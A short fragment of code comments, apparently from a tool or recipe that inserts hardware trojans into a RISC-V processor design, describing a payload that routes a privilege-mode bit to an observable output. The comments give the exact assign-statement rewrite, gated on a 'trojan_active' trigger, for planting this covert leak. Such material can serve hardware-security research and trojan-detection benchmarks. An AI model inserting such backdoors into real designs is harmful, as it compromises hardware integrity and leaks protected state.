 ...
 * Payload: Route rvfi_rs1_addr[0] to observable output
 * 
...
//   Find the assign for rvfi_rs1_addr (or rd_error_o as fallback):
//     assign rvfi_rs1_addr = <normal_expr>;
//   Replace with:
//     assign rvfi_rs1_addr = trojan_active ? rvfi_mode[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? rvfi_mode[0] : 1'b0;
//
